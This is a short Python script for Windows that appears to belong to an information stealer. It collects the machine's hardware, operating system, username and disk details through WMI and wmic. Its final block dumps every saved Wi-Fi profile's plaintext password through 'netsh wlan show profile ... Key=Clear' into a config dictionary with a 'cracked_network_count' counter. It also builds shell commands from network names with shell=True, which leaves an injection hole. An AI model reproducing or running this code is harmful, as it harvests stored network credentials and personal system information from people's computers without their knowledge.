import psutil
import wmi
import config
from subprocess import check_output



disk = psutil.disk_usage('/')


computer = wmi.WMI()
computer_info = computer.Win32_ComputerSystem()[0]
os_info = computer.Win32_OperatingSystem()[0]
cpu_info = computer.Win32_Processor()[0]
calculated_memory = round((int(computer_info.TotalPhysicalMemory) / 1073741824))
gpu_info = computer.Win32_VideoController()[0]
config.registered_username = os_info.RegisteredUser


def format_terminal_output(input_list, new_list):    
    for value in input_list:
        is_integer = True      
        value = value.strip()

        if len(value) == 0:
            continue

        try:
            int(value)
        except ValueError:
            is_integer = False
        
        if is_integer == True:
            new_list.append(int(value))
        else:
            new_list.append(value)
    

unformatted_disk_id = check_output('wmic logicaldisk get deviceid', shell=True).decode().splitlines()
unformatted_disk_size = check_output('wmic logicaldisk get size', shell=True).decode().splitlines()

disk_id = []
disk_size = []
#T O D O
format_terminal_output(unformatted_disk_id, disk_id)
format_terminal_output(unformatted_disk_size, disk_size)

print(disk_id, disk_size)




config.system_disk = f"`Total Disk Storage`: {round(disk.total / 1073741824)}" 
config.system_username = f"`System Primary Username`: {computer_info.Username}" 
config.system_cpu = f"`System Processor`: {cpu_info.Name}, with {cpu_info.NumberOfCores} physical cores, and {cpu_info.ThreadCount} threads. Virtualization is set to {cpu_info.VirtualizationFirmwareEnabled}"
config.system_os = f"`Operating System`: {os_info.Caption}, Version {os_info.Version}"
config.system_memory = f"`Total RAM`: {calculated_memory} GB"
config.system_graphics = f"`Graphics Card`: {gpu_info.Name}"
config.system_motherboard = f"`Motherboard`: {computer_info.Manufacturer} {computer_info.Model}"

config.full_network = {}
config.cracked_network_count =0 
check_networks = check_output('netsh wlan show profiles | find "All User Profile"', shell=True).decode().splitlines()
check_networks[:] = [x.split(":",1)[1].strip() for x in check_networks]
for i in check_networks:
        config.full_network.update({i:check_output(f'netsh wlan show profile name="{i}" Key=Clear | find "Key Content"', shell=True).decode().split(":",1)[1].strip()})
        config.cracked_network_count+=1

   




        


